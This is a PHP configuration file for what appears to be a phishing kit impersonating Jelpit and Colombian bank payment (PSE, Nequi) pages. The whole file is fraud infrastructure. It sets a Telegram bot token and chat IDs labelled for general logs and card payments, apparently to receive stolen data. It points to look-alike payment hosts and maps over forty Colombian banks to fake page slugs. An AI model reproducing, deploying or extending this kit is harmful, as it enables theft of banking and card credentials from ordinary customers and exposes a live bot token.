<?php
// =====================================================
// Configuración Jelpit — edita sólo este archivo
// =====================================================
require_once __DIR__ . '/ban_check.php';

// ── Telegram ──────────────────────────────────────────
define('TG_TOKEN', '8840764725:AAGpJvwQ-BedbwvKzObO00RoUKU8TkBKFQo');
define('TG_CHAT', '-4955190747');   // Chat principal (logs generales) 
define('TG_CHAT_CC', '-5235238333');   // Chat pagos con tarjeta

//define('TG_CHAT', '235905376');   // Chat principal (logs generales) 
//define('TG_CHAT_CC', '-5131767520');   // Chat pagos con tarjeta


// ── PSE ───────────────────────────────────────────────
define('PSE_BASE', 'https://pagosonline-pse.vercel.app');
define('RECAUDOFALL_BASE', 'https://recaudofall.94.250.202.215.nip.io/generar-wompi');
define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#8jiyMZckw4E2nYA6');

// Bancos existentes → vercel (/sites/{slug}/manager/{id})
$PSE_BANKS = [
    'bancolombia' => ['slug' => 'bc', 'id' => '109'],
    'bogota' => ['slug' => 'bg', 'id' => '109'],
    'nequi' => ['slug' => 'nq', 'id' => '109'],
    'popular' => ['slug' => 'pop', 'id' => '109'],
    'caja-social' => ['slug' => 'cj', 'id' => '109'],
];

// Bancos → recaudofall (nombre exacto del select de recaudofall)
$PSE_BANKS_RECAUDOFALL = [
    'davivienda'      => 'Banco davivienda',
    'daviplata'       => 'Daviplata',
    'bbva'            => 'Bbva colombia s.a',
    'colpatria'       => 'Scotiabank colpatria s.a',
    'avvillas'        => 'Banco av villas',
    'itau'            => 'Itau',
    'falabella'       => 'Banco falabella s.a',
    'occidente'       => 'Banco de occidente',
    'coopcentral'     => 'Banco cooperativo coopcentral',
    'bancoomeva'      => 'Bancoomeva',
    'gnb'             => 'Banco gnb sudameris',
    'agrario'         => 'Banco agrario',
    'rappipay'        => 'Rappipay',
    'lulo'            => 'Lulo bank s.a',
    'bancamia'        => 'Bancamia s.a',
    'movii'           => 'Movii s.a',
    'confiar'         => 'Confiar cooperativa financiera',
    'pichincha'       => 'Banco pichincha',
    'serfinanza'      => 'Banco serfinanza s.a',
    'cfa'             => 'Cooperativa financiera de antioquia',
    'union'           => 'Banco unión',
    'citibank'        => 'Citibank',
    'finandina'       => 'Banco finandina s.a',
    'iris'            => 'Iris',
    'coofinep'        => 'Coofinep cooperativa financiera',
    'credifinanciera' => 'Banco credifinanciera s.a',
    'santander'       => 'Banco santander de negocios colombia',
    'coltefinanciera' => 'Coltefinanciera s.a',
    'cotrafa'         => 'Cooperativa financiera cotrafa',
    'nu'              => 'Nu',
    'uala'            => 'Ualá',
    'alianza'         => 'Alianza fiduciaria',
    'jpmorgan'        => 'Banco j.p. morgan colombia s.a.',
    'mundo-mujer'     => 'Banco mundo mujer s.a.',
    'crezcamos'       => 'Crezcamos',
    'dale'            => 'Dale',
    'jfk'             => 'Jfk cooperativa financiera',
    'bold'            => 'Bold cf',
    'juriscoop'       => 'Financiera juriscoop sa compañía de financiamiento',
    'powwi'           => 'Powwi',
    'coink'           => 'Coink sa',
    'ding'            => 'Ding tecnipagos s.a.',
    'global66'        => 'Global66',
];
